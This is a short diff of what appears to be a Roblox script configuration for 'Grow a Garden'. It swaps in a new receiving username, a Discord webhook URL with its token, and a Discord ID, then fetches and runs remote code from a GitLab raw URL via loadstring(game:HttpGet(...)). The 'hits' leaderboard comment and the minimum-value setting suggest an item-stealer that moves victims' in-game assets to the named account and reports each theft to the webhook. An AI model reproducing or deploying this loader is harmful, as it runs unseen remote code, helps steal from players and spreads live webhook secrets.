@@ -1,6 +1,5 @@
-Username = "mala826387"
-Webhook = "https://discord.com/api/webhooks/1402724898987704522/A2tjU_ZsrF4wzep35-myDxEYgnVK2gLPslC_BGcFgI9KbEmjwGKMyO0BqB8TJnG7UAIV"
+Username = "malayzaman4"
+Webhook = "https://discord.com/api/webhooks/1411678366041640981/4visklNE8d0d82a1T5CojbPValVhrkI_foJAAuHjvTs6dYY3W6Ml6kpRJB_vxlrxwrWM"
 MinimumValue = 1
-DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
-
+DiscordID = "1388691554130071672"
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
